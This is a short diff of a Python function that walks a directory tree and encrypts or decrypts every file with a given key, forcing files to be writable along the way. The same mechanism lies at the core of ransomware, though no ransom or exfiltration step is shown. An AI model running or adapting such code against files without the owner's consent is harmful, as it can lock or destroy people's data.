@@ -85,7 +85,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     for subdir, dirs, files in os.walk(rootDirectionary):
         for file in files:
             filename = os.path.join(subdir, file)
-            """try:
+            try:
                 
                 print(filename)
                 newFile = file
@@ -99,9 +99,11 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             except IOError:
                 continue    
             os.rename(newFilename, filename)
-            """
-            if not os.access(filename, os.W_OK):
-                os.chmod(filename, stat.S_IWUSR)
+            try:
+                if not os.access(filename, os.W_OK):
+                    os.chmod(filename, stat.S_IWUSR)
+            except:
+                print("I dont even know")        
             if function == 0:    
                     try:
                         encrypt_file(key, filename, None, 64*1024)
